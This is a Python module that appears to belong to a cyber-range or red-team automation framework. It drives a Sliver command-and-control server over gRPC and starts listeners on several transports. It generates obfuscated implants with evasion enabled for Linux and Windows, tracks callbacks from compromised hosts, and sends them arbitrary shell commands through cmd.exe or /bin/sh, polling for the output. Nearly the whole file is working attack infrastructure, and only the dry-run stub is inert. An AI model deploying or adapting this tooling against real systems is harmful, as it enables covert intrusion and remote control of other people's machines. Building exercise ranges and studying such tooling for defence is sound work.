"""Sliver 1.7 client: gRPC over the operator mTLS profile; a callback is a live session/beacon, attribution is the build name (`<box>-<transport>`)."""

import hashlib
import json
import time
from pathlib import Path

from ..errors import C2Error
from .sliver_proto.commonpb import common_pb2
from .sliver_proto.clientpb import client_pb2 as clientpb
from .sliver_proto.sliverpb import sliver_pb2 as sliverpb
from .sliver_proto.rpcpb import services_pb2  # noqa: F401 - registers the service descriptors

# Every C2 transport v1.7.8 can generate. named-pipe is Windows-only; named-pipe
# and tcp-pivot are pivot transports and need a parent implant to dial through.
TRANSPORTS = ("mtls", "http", "https", "dns", "wg", "named-pipe", "tcp-pivot")
NETWORK_TRANSPORTS = ("mtls", "http", "https", "dns", "wg")
PIVOT_TRANSPORTS = ("named-pipe", "tcp-pivot")
# gateway port -> server port; DNS differs because the implant resolver is fixed
# at port 53 while the server keeps 53 free for the range's own resolver.
DEFAULT_PORTS = {
    "mtls": {"gateway": 8888, "server": 8888, "proto": "tcp"},
    "http": {"gateway": 8080, "server": 8080, "proto": "tcp"},
    "https": {"gateway": 8443, "server": 8443, "proto": "tcp"},
    "dns": {"gateway": 53, "server": 5353, "proto": "udp"},
    "wg": {"gateway": 51820, "server": 51820, "proto": "udp"},
    "tcp-pivot": {"gateway": 9898, "server": 9898, "proto": "tcp"},
}
DEFAULT_DNS_DOMAIN = "c2.sliver.range"
DEFAULT_OPERATOR_CONFIG = "/etc/tlaloc/sliver.cfg"
DEFAULT_BASE_URL = "https://127.0.0.1:31337"
# Sliver reports exit status; a task that ran but returned nonzero still ran.
TERMINAL_BAD = ("canceled", "cancelled")


class SliverClient:
    def __init__(self, cfg, channel=None, now=None, log=None, password=None):
        c2 = cfg.get("c2") or {}
        self.base_url = (c2.get("base_url") or "").rstrip("/")
        self.operator_config = str(c2.get("operator_config")
                                   or DEFAULT_OPERATOR_CONFIG)
        self.dns_domain = str(c2.get("dns_domain") or DEFAULT_DNS_DOMAIN).strip(".")
        self.ports = _ports(c2.get("transports"))
        self.callback_max_age = float(c2.get("callback_max_age_sec", 120))
        self.task_timeout = float(c2.get("task_timeout_sec", 120))
        self.timeout = float(c2.get("timeout_sec", 30))
        self.enabled = bool(c2.get("enabled")) and (bool(self.base_url)
                                                    or channel is not None)
        self._channel = channel
        self._metadata = None
        self._now = now or time.time
        self._started = set()
        self.log = log

    # -- connection ---------------------------------------------------------

    def _connect(self):
        if self._channel is not None:
            return self._channel
        import grpc
        try:
            cfg = json.loads(Path(self.operator_config).read_text(encoding="utf-8"))
        except (OSError, ValueError) as exc:
            raise C2Error(f"sliver operator config {self.operator_config}: {exc}") from exc
        for key in ("lhost", "lport", "ca_certificate", "certificate",
                    "private_key", "token"):
            if not cfg.get(key):
                raise C2Error(f"sliver operator config is missing {key}")
        creds = grpc.ssl_channel_credentials(
            root_certificates=cfg["ca_certificate"].encode(),
            private_key=cfg["private_key"].encode(),
            certificate_chain=cfg["certificate"].encode())
        self._channel = grpc.secure_channel(
            f"{cfg['lhost']}:{int(cfg['lport'])}", creds,
            options=[("grpc.max_receive_message_length", (2 * 1024 ** 3) - 1),
                     # Sliver's server certificate is CN=multiplayer with no IP SAN;
                     # the Go client skips hostname checks, Python must be told the name.
                     ("grpc.ssl_target_name_override", "multiplayer")])
        self._metadata = [("authorization", f"Bearer {cfg['token']}")]
        return self._channel

    def _call(self, method, request, response_type, timeout=None):
        if not self.enabled:
            raise C2Error("c2 disabled (c2.enabled / c2.base_url)")
        channel = self._connect()
        fn = channel.unary_unary(
            f"/rpcpb.SliverRPC/{method}",
            request_serializer=lambda message: message.SerializeToString(),
            response_deserializer=response_type.FromString)
        return fn(request, metadata=self._metadata or (),
                  timeout=timeout or self.timeout)

    # -- listeners ----------------------------------------------------------

    def ensure_listeners(self):
        jobs = {job.Name: job for job in self._call(
            "GetJobs", common_pb2.Empty(), clientpb.Jobs).Active}
        wanted = [
            ("mtls", lambda: self._call(
                "StartMTLSListener",
                clientpb.MTLSListenerReq(Host="0.0.0.0",
                                         Port=self.ports["mtls"]["server"]),
                clientpb.ListenerJob)),
            ("http", lambda: self._call(
                "StartHTTPListener",
                clientpb.HTTPListenerReq(Host="0.0.0.0",
                                         Port=self.ports["http"]["server"],
                                         Secure=False),
                clientpb.ListenerJob)),
            ("https", lambda: self._call(
                "StartHTTPSListener",
                clientpb.HTTPListenerReq(Host="0.0.0.0",
                                         Port=self.ports["https"]["server"],
                                         Secure=True),
                clientpb.ListenerJob)),
            ("dns", lambda: self._call(
                "StartDNSListener",
                clientpb.DNSListenerReq(Domains=[self.dns_domain],
                                        Host="0.0.0.0",
                                        Port=self.ports["dns"]["server"]),
                clientpb.ListenerJob)),
            ("wg", lambda: self._call(
                "StartWGListener",
                clientpb.WGListenerReq(Host="0.0.0.0",
                                       Port=self.ports["wg"]["server"],
                                       NPort=8888, KeyPort=1337),
                clientpb.ListenerJob)),
        ]
        started = []
        for name, start in wanted:
            if name in jobs and jobs[name].Port == self.ports[name]["server"]:
                continue
            if name in jobs:
                self._call("KillJob", clientpb.KillJobReq(ID=jobs[name].ID),
                           clientpb.KillJob)
            start()
            started.append(name)
        self._started.update(started)
        return {"started": started, "jobs": sorted(jobs) + started}

    # -- callbacks and tasking ---------------------------------------------

    def _rows(self):
        rows = []
        for session in self._call("GetSessions", common_pb2.Empty(),
                                  clientpb.Sessions).Sessions:
            rows.append((session, False))
        for beacon in self._call("GetBeacons", common_pb2.Empty(),
                                 clientpb.Beacons).Beacons:
            rows.append((beacon, True))
        return rows

    def _records(self):
        out = []
        for row, is_beacon in self._rows():
            name = str(row.Name or "").strip()
            if not name:
                continue
            seen = float(row.LastCheckin or 0)
            record = {"seen_at": seen or self._now(), "agent": row.Transport or "?",
                      "external_id": row.ID, "name": name, "box_id": _box_id(name),
                      "host": row.Hostname, "user": row.Username,
                      "process": row.Filename, "async": is_beacon,
                      "os": row.OS, "transport": _transport_of(name)}
            if not seen:
                record["stale"] = True
            out.append(record)
        return out

    def callbacks(self):
        """Keyed by box id: the freshest channel per box, all channels under by_name."""
        out = {}
        for record in self._records():
            current = out.get(record["box_id"])
            if current is None or record["seen_at"] > current["seen_at"]:
                out[record["box_id"]] = record
        return out

    def callbacks_by_name(self):
        return {record["name"]: record for record in self._records()}

    def fresh_callbacks(self):
        now = self._now()
        return {box: rec for box, rec in self.callbacks().items()
                if rec.get("seen_at") is not None and not rec.get("stale")
                and (now - rec["seen_at"]) <= self.callback_max_age}

    def callback_for(self, box_id):
        record = self.callbacks().get(box_id)
        if record:
            return record
        for candidate in self.callbacks().values():
            if candidate.get("name") == box_id:
                return candidate
        return None

    def task(self, box_id, command, *, timeout=None):
        if not self.enabled:
            raise C2Error("c2 disabled (c2.enabled / c2.base_url)")
        record = self.callback_for(box_id)
        if not record:
            return {"ok": False, "detail": f"no callback for {box_id}",
                    "output": "", "task_id": None}
        if record.get("async"):
            return self._task_beacon(record, command, timeout=timeout)
        executable = "cmd.exe" if _is_windows(record) else "/bin/sh"
        args = ["/c", command] if _is_windows(record) else ["-c", command]
        response = self._call(
            "Execute",
            sliverpb.ExecuteReq(Path=executable, Args=args, Output=True,
                                Request=common_pb2.Request(
                                    SessionID=record["external_id"])),
            sliverpb.Execute, timeout=timeout or self.task_timeout)
        return _execute_result(response, record)

    def _task_beacon(self, record, command, *, timeout=None):
        executable = "cmd.exe" if _is_windows(record) else "/bin/sh"
        args = ["/c", command] if _is_windows(record) else ["-c", command]
        created = self._call(
            "Execute",
            sliverpb.ExecuteReq(Path=executable, Args=args, Output=True,
                                Request=common_pb2.Request(
                                    Async=True, BeaconID=record["external_id"])),
            sliverpb.Execute, timeout=self.timeout)
        task_id = (created.Response.TaskID if created.Response else "")
        if not task_id:
            return {"ok": False, "detail": "beacon task returned no id",
                    "output": "", "task_id": None}
        deadline = self._now() + float(timeout or self.task_timeout)
        last = ""
        while self._now() < deadline:
            task = self._call("GetBeaconTaskContent",
                              clientpb.BeaconTask(ID=task_id),
                              clientpb.BeaconTask)
            last = str(task.State or "").lower()
            if last == "completed":
                execute = sliverpb.Execute.FromString(task.Response) \
                    if task.Response else sliverpb.Execute()
                return _execute_result(execute, record, task_id=task_id)
            if last in TERMINAL_BAD:
                return {"ok": False, "detail": f"beacon task {last}",
                        "output": "", "task_id": task_id}
            time.sleep(2)
        return {"ok": False,
                "detail": f"beacon task {task_id} still {last or 'pending'} "
                          f"after {timeout or self.task_timeout}s",
                "output": "", "task_id": task_id}

    # -- payload build ------------------------------------------------------

    def build_payload(self, box_id, os_name="linux", transport="mtls",
                      gateway=None, domain=None, pivot_host=None, beacon=False,
                      debug=False):
        if transport not in TRANSPORTS:
            raise C2Error(f"unknown Sliver transport {transport!r}")
        if transport in ("named-pipe", "tcp-pivot"):
            if not pivot_host:
                raise C2Error(f"{transport} is a pivot transport: a parent "
                              f"implant's listener address is required")
        elif not gateway:
            raise C2Error(f"{transport} needs the team gateway address")
        name = f"{box_id}-{transport}" + ("-beacon" if beacon else "")
        url = self.c2_url(transport, gateway=gateway,
                          domain=domain or self.dns_domain,
                          pivot_host=pivot_host, box_id=box_id)
        config = clientpb.ImplantConfig(
            GOOS=_goos(os_name), GOARCH="amd64",
            Format=clientpb.OutputFormat.EXECUTABLE,
            IsBeacon=bool(beacon),
            BeaconInterval=int(60 * 1e9) if beacon else 0,
            BeaconJitter=int(30 * 1e9) if beacon else 0,
            TemplateName="sliver", ObfuscateSymbols=not debug, Evasion=True,
            Debug=bool(debug),
            ReconnectInterval=int(30 * 1e9), MaxConnectionErrors=0,
            HTTPC2ConfigName="default",
            C2=[clientpb.ImplantC2(URL=url, Priority=0)])
        if transport == "wg":
            config.WGPeerTunIP = self._call(
                "GenerateUniqueIP", common_pb2.Empty(),
                clientpb.UniqueWGIP).IP
            config.WGKeyExchangePort = 1337
            config.WGTcpCommsPort = 8888
        self._delete_build(name)
        generated = self._call("Generate",
                               clientpb.GenerateReq(Name=name, Config=config),
                               clientpb.Generate, timeout=900)
        data = generated.File.Data if generated.File else b""
        if not data:
            raise C2Error(f"Sliver build {name} returned no file")
        return {"uuid": generated.ImplantBuildID, "name": name, "box": box_id,
                "os": _goos(os_name), "transport": transport,
                "kind": "beacon" if beacon else "session", "callback": url,
                "data": data, "size": len(data),
                "sha256": hashlib.sha256(data).hexdigest()}

    def c2_url(self, transport, *, gateway=None, domain=None, pivot_host=None,
               box_id=""):
        ports = self.ports
        if transport == "mtls":
            return f"mtls://{gateway}:{ports['mtls']['server']}"
        if transport == "http":
            return f"http://{gateway}:{ports['http']['server']}"
        if transport == "https":
            return f"https://{gateway}:{ports['https']['server']}"
        if transport == "dns":
            # The resolver is fixed at port 53 on the team gateway; the engine
            # DNATs that to the server's 5353.
            return (f"dns://{domain or self.dns_domain}?resolvers={gateway}")
        if transport == "wg":
            return f"wg://{gateway}:{ports['wg']['server']}"
        if transport == "named-pipe":
            pipe = _pipe_name(box_id)
            return f"namedpipe:///pipe/{pipe}"
        if transport == "tcp-pivot":
            return f"tcppivot://{pivot_host}:{ports['tcp-pivot']['gateway']}"
        raise C2Error(f"unknown Sliver transport {transport!r}")

    def _delete_build(self, name):
        try:
            self._call("DeleteImplantBuild", clientpb.DeleteReq(Name=name),
                       common_pb2.Empty)
        except Exception:                  # noqa: BLE001 - not-found is the normal case
            pass  # a fresh server has no build to delete

    def operation(self):
        return {"name": "sliver", "callbacks": len(self.callbacks()),
                "transports": list(TRANSPORTS)}


class FakeSliver:
    """In-memory stand-in; in the package, not tests/, because the seed and CLIs need a no-op C2."""

    def __init__(self, callbacks=None, task_output="[dry-run c2] ok"):
        self._callbacks = dict(callbacks or {})
        self.task_output = task_output
        self.tasks = []
        self.plants = []

    def callbacks(self):
        return dict(self._callbacks)

    def callbacks_by_name(self):
        return {record.get("name"): record for record in self._callbacks.values()}

    def callback_agents(self):
        return {box: rec.get("agent") for box, rec in self._callbacks.items()}

    def fresh_callbacks(self):
        return dict(self._callbacks)

    def callback_for(self, box_id):
        return self._callbacks.get(box_id)

    def plant(self, box_id, os_name="linux", transport="mtls", callback_uri=None,
              extra=None):
        self.plants.append({"box": box_id, "os": os_name, "transport": transport,
                            "callback_uri": callback_uri, "extra": extra or {}})
        return {"ok": True, "detail": f"[dry-run] payload for {box_id}",
                "payload": f"<payloads>/{box_id}.bin", "uuid": f"dry-{box_id}"}

    def task(self, box_id, command, timeout=120):
        self.tasks.append({"box": box_id, "command": command})
        return {"ok": True, "output": self.task_output,
                "task_id": f"dry-task-{len(self.tasks)}"}

    def operation(self):
        return {"name": "dry-run", "callbacks": len(self._callbacks)}


def _ports(override):
    ports = {name: dict(value) for name, value in DEFAULT_PORTS.items()}
    for name, value in (override or {}).items():
        if name not in ports or not isinstance(value, dict):
            continue
        ports[name].update({k: int(v) for k, v in value.items()
                            if k in ("gateway", "server") and v})
    return ports


def _goos(os_name):
    return "windows" if str(os_name).lower() == "windows" else "linux"


def _transport_of(name):
    for transport in TRANSPORTS:
        if name == transport or name.endswith(f"-{transport}"):
            return transport
    if name.endswith("-beacon"):
        return _transport_of(name[:-len("-beacon")])
    return "?"


def _box_id(name):
    base = name[:-len("-beacon")] if name.endswith("-beacon") else name
    for transport in TRANSPORTS:
        suffix = f"-{transport}"
        if base.endswith(suffix):
            return base[:-len(suffix)]
    return base


def _pipe_name(box_id):
    safe = "".join(ch if ch.isalnum() else "-" for ch in str(box_id))
    return f"sliver-{safe or 'implant'}"


def _is_windows(record):
    return str(record.get("os") or "").lower() == "windows" or \
        str(record.get("host") or "").lower().startswith("win")


def _execute_result(response, record, task_id=None):
    if response is None:
        return {"ok": False, "detail": "empty execute response", "output": "",
                "task_id": task_id}
    if response.Response and response.Response.Err:
        return {"ok": False, "detail": response.Response.Err, "output": "",
                "task_id": task_id}
    out = _decode(response.Stdout) + _decode(response.Stderr)
    status = int(response.Status or 0)
    return {"ok": status == 0, "output": out, "status": status,
            "task_id": task_id or (response.Response.TaskID
                                   if response.Response else None),
            "detail": "" if status == 0 else f"exit {status}"}


def _decode(blob):
    if not blob:
        return ""
    try:
        return blob.decode("utf-8", "replace") if isinstance(blob, bytes) else str(blob)
    except Exception:                       # noqa: BLE001
        return ""
